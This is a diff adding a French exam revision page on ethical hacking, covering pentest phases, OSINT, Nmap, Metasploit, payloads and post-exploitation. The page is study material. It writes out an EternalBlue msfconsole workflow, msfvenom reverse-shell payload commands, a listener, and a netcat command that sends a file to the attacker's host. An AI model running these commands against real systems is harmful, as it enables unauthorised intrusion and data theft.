@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="fr" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex, nofollow">
+<title>Ethical Hacking — Cap sur le DE</title>
+<meta name="description" content="Fiche de révision Ethical Hacking : phases du pentest, OSINT, Nmap, Metasploit, brute force, web, annales corrigées.">
+<link rel="icon" href="assets/favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body style="--subject-color:var(--eh);--subject-soft:var(--eh-soft)">
+
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="brand" href="index.html"><span class="brand-mark">DE</span><span>Cap sur le DE<small>ST2 · 5 matières</small></span></a>
+    <nav class="nav-links" aria-label="Navigation principale">
+      <a href="index.html">Accueil</a><a href="plan.html">Plan</a><a href="eh.html" class="active">Hacking</a><a href="reseau.html">Réseaux</a><a href="os.html">OS</a><a href="si.html">SI</a><a href="vs.html">Virtualisation</a><a href="last-minute.html">J-1</a>
+    </nav>
+    <div class="top-actions">
+      <button class="icon-btn" id="btn-search" aria-label="Rechercher"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg></button>
+      <button class="icon-btn" id="btn-theme" aria-label="Changer de thème"></button>
+      <div class="progress-pill"><svg class="ring" id="top-ring" viewBox="0 0 24 24"><circle class="bg" cx="12" cy="12" r="9"/><circle class="fg" cx="12" cy="12" r="9" stroke-dasharray="56.5" stroke-dashoffset="56.5"/></svg><span class="pp-text" id="top-progress-text">0 %</span></div>
+    </div>
+  </div>
+</header>
+
+<main class="wrap">
+  <section class="subject-hero" data-watermark="EH">
+    <div class="kicker">Matière 1 · ST2EH</div>
+    <h1>Ethical Hacking</h1>
+    <p>Le DE mélange un QCM de définitions et 5 questions ouvertes de méthode. Tout ce qui suit est calibré sur les annales 2024 et 2025 : les outils, les commandes et les réponses-types.</p>
+    <div class="subject-meta">
+      <span class="chip">QCM 5 à 12 pts</span>
+      <span class="chip">Questions ouvertes 8 à 15 pts</span>
+      <span class="chip">1 h 50</span>
+      <span class="chip">Sans documents</span>
+    </div>
+    <div class="progress-line"><div class="bar"><i></i></div><span id="subject-progress-text">0/12 notions</span></div>
+  </section>
+
+  <div class="subject-layout">
+    <aside class="toc">
+      <h4>Dans cette fiche</h4>
+      <a href="#vocab">1 · Vocabulaire</a>
+      <a href="#phases">2 · Phases &amp; types de tests</a>
+      <a href="#passive">3 · OSINT &amp; reconnaissance passive</a>
+      <a href="#nmap">4 · Nmap &amp; reconnaissance active</a>
+      <a href="#enum">5 · Énumération &amp; vulnérabilités</a>
+      <a href="#msf">6 · Metasploit</a>
+      <a href="#payloads">7 · Payloads &amp; shells</a>
+      <a href="#post">8 · Post-exploitation</a>
+      <a href="#brute">9 · Brute force</a>
+      <a href="#web">10 · Pentest web</a>
+      <a href="#report">11 · Rapport &amp; méthodologies</a>
+      <a href="#annales">12 · Annales corrigées</a>
+      <a href="#quiz">Quiz express</a>
+      <a href="#flashcards">Flashcards</a>
+      <div class="toc-tools"><button class="btn" data-action="expand">Déplier</button><button class="btn" data-action="collapse">Replier</button></div>
+    </aside>
+
+    <div class="content">
+
+      <div class="box exam">
+        <div class="box-title">Stratégie de copie</div>
+        <p><strong>QCM :</strong> 30 à 40 secondes par question, aucune question laissée vide. Les pièges portent sur <em>passif vs actif</em>, <em>Nmap</em>, <em>Metasploit</em> et <em>brute force vs dictionnaire</em>.</p>
+        <p><strong>Questions ouvertes :</strong> réponds en 3 temps — <strong>définition / méthode</strong>, <strong>outils ou exemples</strong>, <strong>limites ou contre-mesures</strong>. Le correcteur cherche des mots-clés, pas des romans.</p>
+      </div>
+
+      <section class="note" id="vocab" data-topic="eh-1">
+        <div class="note-head"><div class="note-num">1</div><h2>Le vocabulaire qui tombe</h2><label class="topic-check"><input type="checkbox" data-topic="eh-1">Validé</label></div>
+        <p>Un <strong>pentest</strong> est un test d'intrusion autorisé, réalisé par un professionnel, pour identifier les vulnérabilités d'un système avant un attaquant. Le hacker éthique ne corrige pas : il prouve et documente.</p>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Terme</th><th>Définition attendue</th><th>Exemple</th></tr></thead>
+            <tbody>
+              <tr><td><strong>Menace</strong></td><td>Cause potentielle d'incident susceptible d'exploiter une vulnérabilité.</td><td>Un attaquant, un malware, un employé malveillant.</td></tr>
+              <tr><td><strong>Vulnérabilité</strong></td><td>Faiblesse de conception, d'implémentation, d'installation, de configuration ou d'usage.</td><td>Mot de passe par défaut, SMBv1, injection SQL.</td></tr>
+              <tr><td><strong>Exploit</strong></td><td>Code ou technique qui exploite concrètement la vulnérabilité.</td><td>EternalBlue, payload SQLi, script Metasploit.</td></tr>
+              <tr><td><strong>Risque</strong></td><td>Probabilité qu'une menace exploite une vulnérabilité et produise un impact.</td><td>Fuite de données patients, rançon, arrêt de service.</td></tr>
+              <tr><td><strong>ToE</strong></td><td><em>Target of Evaluation</em> : système, programme ou réseau analysé.</td><td>Le serveur web d'une entreprise.</td></tr>
+              <tr><td><strong>Post-exploitation</strong></td><td>Actions menées après l'accès initial : élévation, collecte, persistance, mouvement latéral.</td><td><code>hashdump</code>, <code>migrate</code>, création d'un compte.</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Les catégories de hackers</h3>
+        <div class="grid-3">
+          <div class="box tip"><div class="box-title">White hat</div><p>Autorisé, défensif, professionnel. Il cherche les faiblesses pour les faire corriger.</p></div>
+          <div class="box danger"><div class="box-title">Black hat</div><p>Malveillant, illégal. Il viole l'intégrité des systèmes et obtient un accès non autorisé.</p></div>
+          <div class="box warn"><div class="box-title">Grey hat</div><p>Entre les deux : curiosité, outils offensifs, sans autorisation claire ni intention forcément malveillante.</p></div>
+        </div>
+        <p>À distinguer : <strong>script kiddie</strong> (utilise des outils sans maîtrise), <strong>hacktiviste</strong> (motivation idéologique), <strong>cracker</strong> (casse les protections), <strong>APT</strong> (groupe persistant, financé, ciblé).</p>
+
+        <h3>Les besoins de sécurité</h3>
+        <p><strong>CIA</strong> : Confidentialité, Intégrité, Disponibilité. On y ajoute souvent <strong>Authenticité</strong> et <strong>Non-répudiation</strong>. Le pentest évalue la capacité d'un attaquant à les atteindre.</p>
+
+        <div class="box key">
+          <div class="box-title">À retenir</div>
+          <p>Un <strong>audit</strong> vérifie la conformité à un référentiel. Un <strong>pentest</strong> éprouve l'efficacité réelle des protections en attaquant. Un <strong>scan de vulnérabilités</strong> ne fait que détecter : il produit des faux positifs et ne prouve pas l'exploitabilité.</p>
+        </div>
+      </section>
+
+      <section class="note" id="phases" data-topic="eh-2">
+        <div class="note-head"><div class="note-num">2</div><h2>Les 5 phases &amp; les 3 types de tests</h2><label class="topic-check"><input type="checkbox" data-topic="eh-2">Validé</label></div>
+        <p>La question « décrivez les 5 étapes » revient chaque année. Apprends la version CEH, puis ajoute le rapport.</p>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>#</th><th>Phase</th><th>Objectif</th><th>Outils / exemples</th></tr></thead>
+            <tbody>
+              <tr><td>1</td><td><strong>Reconnaissance</strong> (footprinting)</td><td>Collecter un maximum d'informations sur la cible sans (ou avec) interaction.</td><td>Whois, DNS, OSINT, Google Dorks, theHarvester, Maltego, Shodan.</td></tr>
+              <tr><td>2</td><td><strong>Scanning &amp; énumération</strong></td><td>Découvrir hôtes, ports, services, versions, OS, utilisateurs et partages.</td><td>Nmap, nbtscan, enum4linux, Nikto, Gobuster, Nessus.</td></tr>
+              <tr><td>3</td><td><strong>Obtention d'accès</strong> (exploitation)</td><td>Exploiter une vulnérabilité pour obtenir un premier accès.</td><td>Metasploit, sqlmap, Hydra, Burp Suite, exploit public.</td></tr>
+              <tr><td>4</td><td><strong>Maintien d'accès</strong> (persistance)</td><td>Conserver l'accès : backdoor, compte, tâche planifiée, rootkit.</td><td>Meterpreter, persistence, cron, service, clé SSH.</td></tr>
+              <tr><td>5</td><td><strong>Effacement des traces</strong></td><td>Supprimer ou modifier les preuves : logs, fichiers, historique.</td><td>Anti-forensique, nettoyage des journaux, timestomping.</td></tr>
+              <tr><td>+</td><td><strong>Rapport</strong></td><td>Restituer les constats, preuves, risques et recommandations.</td><td>Rapport écrit + synthèse exécutive + remédiation.</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Les 3 types de tests</h3>
+        <div class="grid-3">
+          <div class="box"><div class="box-title">Black-box</div><p>Aucune information initiale. Simule un attaquant externe. Les phases de reconnaissance et de scan prennent le plus de temps.</p></div>
+          <div class="box"><div class="box-title">White-box</div><p>Connaissance complète : architecture, code, identifiants. Le test est plus rapide et plus profond. Un audit interne par l'admin est un white-box.</p></div>
+          <div class="box"><div class="box-title">Grey-box</div><p>Connaissances d'un utilisateur standard. Le plus courant en pratique : il mesure l'impact d'une compromission interne.</p></div>
+        </div>
+
+        <h3>Les 3 phases de la mission</h3>
+        <ol>
+          <li><strong>Préparation / cadrage :</strong> contrat, périmètre, autorisations écrites, règles d'engagement, type de test, fenêtre horaire, contacts, gestion des données.</li>
+          <li><strong>Conduite &amp; analyse :</strong> tests, collecte des preuves, qualification des vulnérabilités, calcul CVSS.</li>
+          <li><strong>Conclusion / restitution :</strong> rapport, synthèse exécutive, plan de remédiation, réunion de clôture.</li>
+        </ol>
+        <div class="box warn"><div class="box-title">Point juridique</div><p>Sans autorisation écrite, un pentest est un délit (accès frauduleux, atteinte au système). Le hacker éthique ne « corrige » pas la cible et doit protéger les données collectées.</p></div>
+      </section>
+
+      <section class="note" id="passive" data-topic="eh-3">
+        <div class="note-head"><div class="note-num">3</div><h2>OSINT &amp; reconnaissance passive</h2><label class="topic-check"><input type="checkbox" data-topic="eh-3">Validé</label></div>
+        <p><strong>Reconnaissance passive :</strong> collecter des informations sans interagir directement avec la cible. <strong>Active :</strong> envoyer du trafic à la cible (scan, requêtes, connexions). Le passif est discret mais peut être incomplet ; l'actif est plus fiable mais détectable.</p>
+
+        <h3>Le footprinting</h3>
+        <p>Le <em>footprinting</em> rassemble tout ce qui est disponible sur l'organisation : site web, téléphone/fax/VoIP, actualités, offres d'emploi (technologies utilisées), clients/fournisseurs, archives web, réseaux sociaux, métadonnées de documents.</p>
+        <div class="box key"><div class="box-title">Les 3 sources à citer</div>
+          <ul><li><strong>Technique :</strong> WHOIS, DNS, certificats, Shodan, en-têtes HTTP, technologies web.</li>
+          <li><strong>Humaine :</strong> réseaux sociaux, organigramme, emails, offres d'emploi, conférences.</li>
+          <li><strong>Documentaire :</strong> PDF, métadonnées, archives, brevets, communiqués.</li></ul>
+        </div>
+
+        <h3>Les outils OSINT à connaître</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Outil</th><th>Ce qu'il fait</th><th>Quand l'utiliser</th></tr></thead>
+            <tbody>
+              <tr><td><strong>WHOIS</strong></td><td>Informations d'enregistrement d'un domaine : registrar, dates, nameservers, contacts.</td><td>Identifier le propriétaire, l'hébergeur, l'ancienneté.</td></tr>
+              <tr><td><strong>dig / nslookup</strong></td><td>Résolution DNS : A, MX, TXT, NS, reverse DNS.</td><td>Révéler le fournisseur mail (MX), SPF/DMARC (TXT), l'infrastructure.</td></tr>
+              <tr><td><strong>crt.sh</strong></td><td>Certificats SSL publics et sous-domaines associés.</td><td>Trouver des sous-domaines oubliés (dev, staging, admin).</td></tr>
+              <tr><td><strong>theHarvester</strong></td><td>Collecte emails, domaines, IP, URLs depuis des sources publiques.</td><td>Reconnaissance initiale et phishing ciblé (dans un cadre autorisé).</td></tr>
+              <tr><td><strong>Shodan</strong></td><td>Moteur de recherche des services exposés sur Internet (IoT, serveurs, bases).</td><td>Voir les ports/services réellement exposés, sans scanner.</td></tr>
+              <tr><td><strong>Maltego</strong></td><td>Cartographie visuelle des relations entre entités (domaines, IP, emails, personnes).</td><td>Corréler et visualiser une investigation complexe.</td></tr>
+              <tr><td><strong>Recon-ng</strong></td><td>Framework OSINT modulaire, proche de Metasploit.</td><td>Automatiser un workflow collecte → enrichissement → rapport.</td></tr>
+              <tr><td><strong>SpiderFoot</strong></td><td>Collecte automatisée multi-sources, détection de fuites.</td><td>Vue large et rapide d'une exposition.</td></tr>
+              <tr><td><strong>FOCA</strong></td><td>Extraction de métadonnées de documents (PDF, Word, Excel).</td><td>Trouver noms d'utilisateurs, chemins, logiciels.</td></tr>
+              <tr><td><strong>GHunt / Sherlock</strong></td><td>Recherche d'identités et de comptes à partir d'un email ou pseudo.</td><td>Profilage OSINT (cadre légal strict).</td></tr>
+              <tr><td><strong>WhatWeb</strong></td><td>Fingerprinting web : CMS, serveur, frameworks, versions.</td><td>Identifier la stack avant de chercher des vulnérabilités.</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Google Dorks</h3>
+        <p>Requêtes avancées pour trouver des informations indexées : <code>site:example.com</code>, <code>filetype:pdf</code>, <code>intitle:"index of"</code>, <code>inurl:admin</code>, <code>intext:"mot de passe"</code>. C'est de la reconnaissance <strong>passive</strong> : on interroge Google, pas la cible.</p>
+
+        <h3>Le cycle OSINT</h3>
+        <ol>
+          <li><strong>Définition des besoins</strong> : objectifs, périmètre, questions à résoudre.</li>
+          <li><strong>Collecte</strong> : sources ouvertes, outils, APIs.</li>
+          <li><strong>Traitement</strong> : dédoublonnage, normalisation, suppression des faux positifs.</li>
+          <li><strong>Analyse</strong> : recoupement, contextualisation, hypothèses.</li>
+          <li><strong>Diffusion</strong> : rapport structuré, sources datées, niveau de confiance.</li>
+        </ol>
+        <div class="box tip"><div class="box-title">Nettoyage &amp; validation (question 2025)</div><p>Dédoublonner, vérifier chaque information par <strong>au moins deux sources indépendantes</strong>, dater la collecte, distinguer fait et hypothèse, écarter les faux positifs, conserver la source et le niveau de confiance. Sans ça, on construit une attaque sur des informations fausses.</p></div>
+
+        <div class="box warn"><div class="box-title">Cadre légal</div><p>RGPD, respect de la vie privée, pas de doxing, pas d'accès à des données privées, finalité explicite. L'OSINT n'autorise pas à contourner une authentification.</p></div>
+      </section>
+
+      <section class="note" id="nmap" data-topic="eh-4">
+        <div class="note-head"><div class="note-num">4</div><h2>Nmap &amp; reconnaissance active</h2><label class="topic-check"><input type="checkbox" data-topic="eh-4">Validé</label></div>
+        <p>Nmap envoie des paquets à la cible : c'est donc de la reconnaissance <strong>active</strong>. Il permet de découvrir les hôtes, les ports, les services, les versions et l'OS.</p>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Option</th><th>Rôle</th><th>Piège</th></tr></thead>
+            <tbody>
+              <tr><td><code>-sP</code> / <code>-sn</code></td><td>Découverte d'hôtes sans scan de ports (ping scan).</td><td>Ne dit pas si les ports sont ouverts.</td></tr>
+              <tr><td><code>-sS</code></td><td>Scan SYN « half-open » : rapide et discret.</td><td>Nécessite les privilèges root.</td></tr>
+              <tr><td><code>-sT</code></td><td>Scan TCP connect : handshake complet.</td><td>Plus visible dans les logs.</td></tr>
+              <tr><td><code>-sV</code></td><td>Détection de version des services.</td><td>Ce n'est pas la détection d'OS.</td></tr>
+              <tr><td><code>-O</code></td><td>Détection du système d'exploitation.</td><td>Nécessite souvent root et une cible accessible.</td></tr>
+              <tr><td><code>-p-</code></td><td>Scan des 65 535 ports TCP.</td><td>Très long ; à réserver aux cibles sérieuses.</td></tr>
+              <tr><td><code>-Pn</code></td><td>Ne pas faire de découverte d'hôte (considérer la cible comme up).</td><td>Utile si l'ICMP est bloqué.</td></tr>
+              <tr><td><code>-A</code></td><td>Mode agressif : OS, versions, scripts, traceroute.</td><td>Très bruyant.</td></tr>
+              <tr><td><code>--script</code></td><td>Exécuter un ou plusieurs scripts NSE.</td><td>Catégories : safe, default, auth, vuln, exploit…</td></tr>
+              <tr><td><code>-sU</code></td><td>Scan UDP.</td><td>Lent et souvent filtré.</td></tr>
+              <tr><td><code>-sA</code></td><td>Scan ACK : cartographie les règles de firewall.</td><td>Ne dit pas si le port est ouvert.</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Les techniques de scan</h3>
+        <ul>
+          <li><strong>TCP connect</strong> : handshake complet, facile à détecter mais ne nécessite pas root.</li>
+          <li><strong>TCP SYN</strong> : envoie SYN, répond RST si fermé ; si ouvert, SYN-ACK puis RST. Plus furtif.</li>
+          <li><strong>FIN / Xmas / NULL</strong> : jouent sur les réponses des stacks ; efficaces sur certains OS, bloqués par les pare-feux modernes.</li>
+          <li><strong>UDP</strong> : pas de handshake ; les réponses ICMP « port unreachable » indiquent un port fermé.</li>
+          <li><strong>Idle scan</strong> : utilise un « zombie » pour masquer l'adresse de l'attaquant.</li>
+        </ul>
+
+        <h3>NSE — Nmap Scripting Engine</h3>
+        <p>Moteur de scripts <strong>Lua</strong> intégré à Nmap. Il automatise la détection de vulnérabilités, l'énumération et les tests de configuration. Catégories : <code>safe</code>, <code>default</code>, <code>auth</code>, <code>vuln</code>, <code>exploit</code>, <code>brute</code>, <code>discovery</code>…</p>
+        <pre><code>nmap -sV --script vuln 192.168.1.10
+nmap --script smb-enum-users -p445 192.168.1.10
+nmap --script http-title,http-headers -p80,443 example.com
+nmap --script ssl-heartbleed -p443 example.com</code></pre>
+        <div class="box key"><div class="box-title">Réponse type « NSE »</div><p>Le NSE est un moteur de scripts Lua intégré à Nmap. Il permet d'aller au-delà du simple scan de ports : bannières, énumération SMB/LDAP/HTTP, détection de CVE (Heartbleed, SMBv1), brute force contrôlé. On l'utilise avec <code>--script</code>, éventuellement par catégorie (<code>vuln</code>, <code>safe</code>). Les scripts sont plus fiables qu'une simple version, mais peuvent être bruyants et produire des faux positifs.</p></div>
+
+        <h3>Traceroute</h3>
+        <p>Envoie des paquets avec un TTL croissant (1, 2, 3…). Chaque routeur décrémente le TTL ; quand il atteint 0, il renvoie un ICMP « Time Exceeded ». On cartographie ainsi les routeurs et passerelles traversés. <strong>Ce n'est pas un scan de ports.</strong></p>
+
+        <div class="box warn"><div class="box-title">Pièges QCM</div>
+        <ul><li><code>-sV</code> = version, <code>-O</code> = OS. Ne pas inverser.</li><li>Nmap est actif, Whois/Google Dork/Shodan sont passifs.</li><li>Un scan de vulnérabilités ne prouve pas qu'une faille est exploitable.</li></ul></div>
+      </section>
+
+      <section class="note" id="enum" data-topic="eh-5">
+        <div class="note-head"><div class="note-num">5</div><h2>Énumération &amp; scan de vulnérabilités</h2><label class="topic-check"><input type="checkbox" data-topic="eh-5">Validé</label></div>
+        <p>Après le scan, on cherche <strong>qui</strong> et <strong>quoi</strong> : utilisateurs, groupes, partages, services, versions, domaines. C'est l'énumération.</p>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Service</th><th>Outils</th><th>Informations</th></tr></thead>
+            <tbody>
+              <tr><td>SMB / Windows</td><td><code>enum4linux</code>, <code>smbclient</code>, scripts NSE <code>smb-*</code></td><td>Partages, utilisateurs, groupes, politique de mot de passe.</td></tr>
+              <tr><td>NetBIOS</td><td><code>nbtscan</code></td><td>Noms NetBIOS, groupe de travail/domaine, adresses MAC.</td></tr>
+              <tr><td>DNS</td><td><code>dnsenum</code>, <code>dnsrecon</code>, <code>dig</code></td><td>Sous-domaines, MX, NS, transferts de zone.</td></tr>
+              <tr><td>LDAP</td><td><code>ldapsearch</code>, NSE <code>ldap-*</code></td><td>Base DN, utilisateurs, annuaire, anonymous bind.</td></tr>
+              <tr><td>SNMP</td><td><code>snmpwalk</code></td><td>Interfaces, routes, versions, communauté par défaut.</td></tr>
+              <tr><td>HTTP</td><td><code>gobuster</code>, <code>dirb</code>, <code>nikto</code>, <code>whatweb</code></td><td>Répertoires, fichiers, CMS, en-têtes, vulnérabilités web.</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Legion vs nbtscan (question 2024 et 2025)</h3>
+        <div class="grid-2">
+          <div class="box"><div class="box-title">Legion</div><p>Framework d'énumération automatisé avec interface graphique. Il orchestre Nmap puis lance automatiquement des outils spécialisés selon les services détectés (enum4linux pour SMB, Nikto pour HTTP…). <strong>Généraliste, multi-protocoles, visuel, profond.</strong></p></div>
+          <div class="box"><div class="box-title">nbtscan</div><p>Outil en ligne de commande spécialisé NetBIOS. Il scanne une plage d'adresses et retourne les noms NetBIOS, domaines/groupes de travail, adresses MAC. <strong>Rapide, ciblé Windows, sans authentification.</strong></p></div>
+        </div>
+        <p><strong>Différence d'approche :</strong> Legion automatise et corrèle plusieurs outils ; nbtscan exécute une seule tâche très bien. Les deux sont complémentaires : nbtscan pour un premier balayage Windows, Legion pour une énumération complète.</p>
+
+        <h3>Scan de vulnérabilités</h3>
+        <p>Outils : <strong>Nessus</strong>, <strong>OpenVAS</strong>, <strong>Nikto</strong> (web), <strong>Nuclei</strong> (templates CVE), <strong>WPScan</strong> (WordPress), <strong>searchsploit</strong> (base Exploit-DB). Un scanner produit des <strong>faux positifs</strong> : il faut vérifier manuellement (levée de doute) avant de conclure. Le score <strong>CVSS</strong> aide à prioriser.</p>
+        <div class="box tip"><div class="box-title">Vocabulaire</div><p><strong>Vulnerability scan</strong> = détection. <strong>Pentest</strong> = exploitation contrôlée pour prouver l'impact. <strong>Red team</strong> = simulation d'attaque complète et furtive. <strong>Bug bounty</strong> = programme de divulgation rémunéré.</p></div>
+      </section>
+
+      <section class="note" id="msf" data-topic="eh-6">
+        <div class="note-head"><div class="note-num">6</div><h2>Exploitation avec Metasploit</h2><label class="topic-check"><input type="checkbox" data-topic="eh-6">Validé</label></div>
+        <p>Metasploit est un framework d'exploitation qui regroupe modules, payloads, encoders et base de données de vulnérabilités. Il sert à <strong>identifier et exploiter</strong> des vulnérabilités, pas à scanner passivement.</p>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Type de module</th><th>Rôle</th><th>Exemple</th></tr></thead>
+            <tbody>
+              <tr><td><strong>Exploit</strong></td><td>Exploite une vulnérabilité précise.</td><td><code>exploit/windows/smb/ms17_010_eternalblue</code></td></tr>
+              <tr><td><strong>Auxiliary</strong></td><td>Reconnaissance, scan, brute force, sans exploitation directe.</td><td><code>auxiliary/scanner/ssh/ssh_login</code></td></tr>
+              <tr><td><strong>Payload</strong></td><td>Code exécuté après l'exploit (shell, Meterpreter).</td><td><code>windows/meterpreter/reverse_tcp</code></td></tr>
+              <tr><td><strong>Encoder</strong></td><td>Encode le payload pour éviter certaines signatures.</td><td><code>x86/shikata_ga_nai</code></td></tr>
+              <tr><td><strong>NOP</strong></td><td>Remplissage pour stabiliser les exploits mémoire.</td><td><code>x86/opty2</code></td></tr>
+              <tr><td><strong>Post</strong></td><td>Actions après exploitation.</td><td><code>post/windows/gather/hashdump</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Workflow msfconsole</h3>
+        <pre><code>msfconsole
+search ms17_010
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 192.168.1.20
+set LHOST 192.168.1.50
+set LPORT 4444
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run
+sessions -i 1
+background
+sessions -l</code></pre>
+        <div class="grid-2">
+          <div class="box key"><div class="box-title">RHOST / LHOST</div><p><strong>RHOST</strong> = cible distante. <strong>LHOST</strong> = adresse de l'attaquant qui écoute. Une erreur classique du QCM : <code>set target</code> n'existe pas, il faut <code>set RHOSTS</code>.</p></div>
+          <div class="box key"><div class="box-title">Modules auxiliaires</div><p>Ils effectuent des tâches de reconnaissance (scan, énumération, brute force) <strong>sans exploiter</strong> la cible. C'est leur principal avantage.</p></div>
+        </div>
+        <h3>Meterpreter</h3>
+        <p>Payload avancé qui s'exécute <strong>en mémoire</strong>, chiffre ses communications et fournit un shell interactif. Il ne touche pas le disque (sauf commande explicite), ce qui le rend discret. Commandes : <code>getuid</code>, <code>sysinfo</code>, <code>ps</code>, <code>migrate</code>, <code>hashdump</code>, <code>screenshot</code>, <code>keyscan_start</code>, <code>webcam_snap</code>, <code>portfwd</code>, <code>shell</code>.</p>
+        <div class="box warn"><div class="box-title">Pièges QCM</div><ul><li>Meterpreter = shell en mémoire, pas un scanner.</li><li>Les modules auxiliaires ne exploitent pas.</li><li><code>msfvenom</code> génère des payloads, ce n'est pas un scanner web.</li><li><code>use exploit/multi/handler</code> sert à écouter un payload généré (reverse shell).</li></ul></div>
+      </section>
+
+      <section class="note" id="payloads" data-topic="eh-7">
+        <div class="note-head"><div class="note-num">7</div><h2>Payloads, shells &amp; msfvenom</h2><label class="topic-check"><input type="checkbox" data-topic="eh-7">Validé</label></div>
+        <h3>Les types de payloads</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Type</th><th>Principe</th><th>Usage</th></tr></thead>
+            <tbody>
+              <tr><td><strong>Single</strong></td><td>Tout le code est dans un seul fichier.</td><td>Simple, mais plus gros et plus détectable.</td></tr>
+              <tr><td><strong>Stager</strong></td><td>Petit code qui télécharge la suite (stage).</td><td>Contourne les limites de taille ; nécessite un handler.</td></tr>
+              <tr><td><strong>Stage</strong></td><td>Charge utile téléchargée par le stager.</td><td>Souvent Meterpreter.</td></tr>
+              <tr><td><strong>Bind shell</strong></td><td>La cible ouvre un port, l'attaquant s'y connecte.</td><td>Bloqué par les pare-feux entrants.</td></tr>
+              <tr><td><strong>Reverse shell</strong></td><td>La cible se connecte vers l'attaquant.</td><td>Traverse mieux les NAT et pare-feux sortants.</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>msfvenom</h3>
+        <p>Génère un payload personnalisé pour une plateforme et un format donnés.</p>
+        <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
+
+msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf
+
+msfvenom -p php/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php</code></pre>
+        <div class="box key"><div class="box-title">Syntaxe à retenir</div><p><code>-p</code> = payload, <code>LHOST</code>/<code>LPORT</code> = écoute de l'attaquant, <code>-f</code> = format, <code>-o</code> = fichier de sortie. Pour un reverse TCP Windows : <code>windows/x64/meterpreter/reverse_tcp</code> (ou <code>shell_reverse_tcp</code>).</p></div>
+
+        <h3>Le handler</h3>
+        <pre><code>use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+set LPORT 4444
+run</code></pre>
+
+        <h3>Netcat, HTTP, ngrok</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Besoin</th><th>Commande</th></tr></thead>
+            <tbody>
+              <tr><td>Écouter sur le port 1234</td><td><code>nc -lvnp 1234</code> (ou <code>nc -lvp 1234</code>)</td></tr>
+              <tr><td>Se connecter à un service</td><td><code>nc 192.168.1.20 80</code></td></tr>
+              <tr><td>Envoyer un fichier</td><td><code>nc 192.168.1.50 4444 &lt; fichier</code></td></tr>
+              <tr><td>Recevoir un fichier</td><td><code>nc -lvnp 4444 &gt; fichier</code></td></tr>
+              <tr><td>Serveur HTTP local</td><td><code>python3 -m http.server 8000</code></td></tr>
+              <tr><td>Exposer un serveur local</td><td><code>ngrok http 8080</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="box warn"><div class="box-title">Attention aux options</div><p><code>nc -e</code> exécute une commande (souvent utilisé pour un reverse shell), ce n'est pas l'option d'écoute. <code>-l</code> = listen, <code>-v</code> = verbose, <code>-n</code> = pas de DNS, <code>-p</code> = port.</p></div>
+      </section>
+
+      <section class="note" id="post" data-topic="eh-8">
+        <div class="note-head"><div class="note-num">8</div><h2>Post-exploitation &amp; persistance</h2><label class="topic-check"><input type="checkbox" data-topic="eh-8">Validé</label></div>
+        <p>Une fois l'accès obtenu, l'attaquant cherche à <strong>augmenter ses privilèges</strong>, <strong>collecter des informations</strong>, <strong>se déplacer</strong> et <strong>rester</strong>.</p>
+        <div class="grid-2">
+          <div class="box"><div class="box-title">1 · Élévation de privilèges</div><p>Exploiter une configuration faible (sudo mal configuré, service vulnérable, SUID, tâche planifiée, token Windows). Sous Windows : UAC bypass, token theft, services non quotés.</p></div>
+          <div class="box"><div class="box-title">2 · Collecte de credentials</div><p><code>hashdump</code>, Mimikatz, SAM, LSASS, tickets Kerberos, fichiers de configuration, variables d'environnement, navigateurs.</p></div>
+          <div class="box"><div class="box-title">3 · Mouvement latéral</div><p>Pass-the-Hash, Pass-the-Ticket, RDP, SMB, WinRM, SSH, pivoting via <code>portfwd</code> ou un tunnel.</p></div>
+          <div class="box"><div class="box-title">4 · Persistance</div><p>Compte local, clé SSH, tâche planifiée, service, run key, cron, rootkit. Objectif : survivre à un redémarrage.</p></div>
+          <div class="box"><div class="box-title">5 · Exfiltration</div><p>Copie de données, compression, chiffrement, canal DNS/HTTP, cloud. Impact confidentiality.</p></div>
+          <div class="box"><div class="box-title">6 · Nettoyage</div><p>Suppression des outils, des comptes, des tâches, des logs. Anti-forensique. Le pentest doit au contraire documenter et remettre la cible en état.</p></div>
+        </div>
+
+        <h3>Les contre-mesures (question 2024)</h3>
+        <ul class="two-col-list">
+          <li><strong>Moindre privilège</strong> : comptes et services limités.</li>
+          <li><strong>Mises à jour</strong> et gestion des correctifs.</li>
+          <li><strong>Désactivation des services inutiles.</strong></li>
+          <li><strong>Permissions strictes</strong> sur les fichiers sensibles.</li>
+          <li><strong>SELinux / AppArmor</strong> (MAC).</li>
+          <li><strong>Chiffrement</strong> des données sensibles.</li>
+          <li><strong>Journalisation centralisée</strong> et alertes.</li>
+          <li><strong>EDR / antivirus</strong> et détection comportementale.</li>
+          <li><strong>Surveillance des élévations</strong> de privilèges.</li>
+          <li><strong>Détection des shells en mémoire</strong> (Meterpreter).</li>
